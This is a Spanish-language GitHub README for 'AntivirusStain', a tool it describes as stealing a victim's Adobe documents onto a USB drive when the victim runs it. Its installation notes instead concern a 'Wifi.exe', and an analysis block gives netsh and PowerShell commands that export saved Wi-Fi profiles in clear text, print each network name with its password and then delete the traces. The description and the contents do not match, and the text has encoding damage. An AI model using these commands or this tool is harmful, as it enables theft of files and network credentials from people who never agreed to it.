# AntivirusStain

AntivirusStain roba todo lo que es documento de Adobe y las copia a una USB cuando la victima lo ejecute la aplicaciÃ³n.
![](https://2.bp.blogspot.com/-Jpa300XYoVA/W_-YJ_a9BkI/AAAAAAAACIM/S3hLHke0eqQgEpzNPkPKxuD1ilT7d5VVwCLcBGAs/s1600/Captura.PNG)

- MAS  https://www.lpericena.tk/2018/06/wi-fi.html

### Pre-requisitos
_Que cosas necesitas para instalar el software y como instalarlas_

```
 - windows 7/10
 - USB 
```

### Instalacion
```
Ejecutar el programa Wifi.exe existe varias versiones para windows 7/10
```
_Y repite_
```
hasta finalizar
```

## Ejecutando las pruebas
![](https://2.bp.blogspot.com/-pcjveMFRyPs/WzgG7BZfUJI/AAAAAAAALec/2jhy6c3UqpUxq9fIqICch4UjsSG5w6EMwCLcBGAs/s1600/wifi.png)
visita la pagina web para que puedas ver el proceso de la instalaci¨®n y el uso
https://www.lpericena.tk/2018/06/wi-fi.html

### Analice 
```
Rem --- Wifi-Export ---
md c:\Config-WiFi
netsh wlan export profile "XXXXXXXXX" folder=c:\Config-WiFi
Rem --- Wifi-Import ---
netsh wlan add profile filename="c:\Config-WiFi\XXXXXXXXX.xml" user=current
-Mostar las Wifis configuradas:
wlan show profiles
-Exportar todas las Wifi configuradas:
wlan export profile
-Exportar un SSID concreto:
wlan export profile name=”SSID_DESEADO” folder=”carpeta de destino”
-Para importar un SSID en concreto:
wlan add profile filename=”SSID_RED.xml”
mkdir wifi
cd wifi
netsh wlan export profile key=clear
dir *.xml |% {
$xml=[xml] (get-content $_)
Write-Host $xml.WLANProfile.SSIDConfig.SSID.name `t $xml.WLANProfile.MSM.Security.sharedKey.keymaterial
}
cd ..
rmdir -recurse wifi
```


## Deployment 
#### LICENSE
- Permisos
```
* Uso comercial
* Distribucion
* Modificacion
* Uso de patentes
* Uso privado
```
- Condiciones	Limitaciones
```
*  Revelar la fuente
*  Aviso de licencia y copyright
*  Misma licencia
*  Cambios de estado
*  Responsabilidad
*  Garant¨ªa
```
## Construido con* [Notepad++](https://notepad-plus-plus.org/download/) - Editor de texto (IDE)

_Menciona a todos aquellos que ayudaron a levantar el proyecto desde sus inicios_

* **Luishi?o Pericena Choque ** - *Desarrollo del software* - [Pericena](https://github.com/Pericena)

Tambi¨¦n puedes mirar la lista de todos los [contribuyentes](https://github.com/Pericena/Antivirus-Stain/contributors) qu¨ªenes han participado en este proyecto. 

## Licencia ??

Este proyecto est¨® bajo la Licencia (Licencia publica general de GNU) - mira el archivo [LICENSE.md](LICENSE.md) para detalles

---
Por [Pericena](https://github.com/Pericena)
